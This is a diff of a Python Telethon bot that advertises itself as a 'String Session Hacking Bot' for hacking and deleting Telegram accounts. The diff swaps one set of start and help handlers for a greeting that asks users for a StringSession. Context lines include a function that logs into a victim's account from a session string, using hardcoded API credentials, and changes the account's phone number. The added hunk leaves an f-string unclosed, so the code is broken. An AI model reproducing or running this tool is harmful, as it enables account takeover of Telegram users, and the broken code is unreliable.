@@ -23,58 +23,6 @@ from telethon.tl.functions.channels import CreateChannelRequest as ccr
 mybot = "missrose_bot"
 bot = borg = client
 
-
-@bot.on(events.callbackquery.CallbackQuery(data=re.compile(b"suru"))) 
-async def _(event):
-     await event.edit(LSTART, buttons=start) 
-
-ohk = [[custom.Button.inline("Back", data="suru")]]
-
-start = [[custom.Button.inline("Configuration Tutorial", data="contut"), custom.Button.inline("Commands", data="hack")]]
-start += [[custom.Button.url("Add me to your group", "t.me/Seona_RoBot?=start")]]
-
-@bot.on(events.callbackquery.CallbackQuery(data=re.compile(b"UNK")))
-async def _(event):
-    await event.edit(PM, buttons=soja)
-@bot.on(events.NewMessage(pattern="^/start$"))
-async def _(event):
-      START = f'''Hello {event.sender.first_name}, nice to meet you!
-I'm Hack Session Bot, an advanced hacking bot to hack telegram accounts.
-I can do a lot of cool stuffs, here's a short list:
-• I can hack entire telegram account.
-• I can delete telegram accounts.
-.'''
-      await bot.send_message(event.chat.id,START, buttons=start)
-
-HLP = '''Here is the list of all possible commands:
-- /start: Starts me! You've probably already used this.
-- /hack: Sends this message; I'll tell you more about myself!
-If you have any bugs or questions on how to use me head to @HackTeleAcc.
- All commands can be used with the following: / ? !'''
-
-
-@bot.on(events.callbackquery.CallbackQuery(data=re.compile(b"command"))) 
-async def _(event):
-     await event.edit(HLP, buttons=kk) 
-  
-@bot.on(events.NewMessage(pattern="/help"))
-async def _(event):
-   if not event.is_group:
-    await bot.send_message(event.chat.id,HLP, buttons=kk)
-   else:
-    await event.reply("**Click me for help!**", buttons=[[Button.url("Click me for help","t.me/HackSessionBot?start=help")]])
-    
-@bot.on(events.NewMessage(pattern="^/start help"))
-async def _(event):
-     await event.reply(HLP, buttons=kk)
-
-@bot.on(events.callbackquery.CallbackQuery(data="hack"))
-async def _(event):
-     await event.reply(HLP, button=kk)
-
-
-
-
 async def change_number_code(strses, number, code, otp):
   async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
     bot = client = X
@@ -232,8 +180,15 @@ M: [Change Phone number using StringSession]
 I ADD MORE FEATURES LATER 😆
 '''
 mm = '''
-
+Hello This is String Session Hacking Bot.
+Take StringSession and use me
+I will give you full power of mine
+Type /hack
 '''
+@client.on(events.NewMessage(pattern="^/start$"))
+async def _(event):
+      START = f'''Hello {event.sender.first_name}, nice to meet you!
+      
 @client.on(events.NewMessage(pattern="/start"))
 async def op(event):
   global mm
